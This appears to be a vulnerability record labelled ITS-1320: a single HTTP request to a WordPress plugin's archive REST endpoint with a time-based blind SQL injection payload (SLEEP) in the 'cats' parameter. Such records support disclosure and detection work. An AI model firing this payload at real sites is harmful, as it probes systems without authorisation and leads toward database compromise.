# Vulnerable: ITS-1320
GET /wp-json/jalw/v1/archive?cats=if(now()=sysdate(),SLEEP(6),0)&exclusionType=exclude
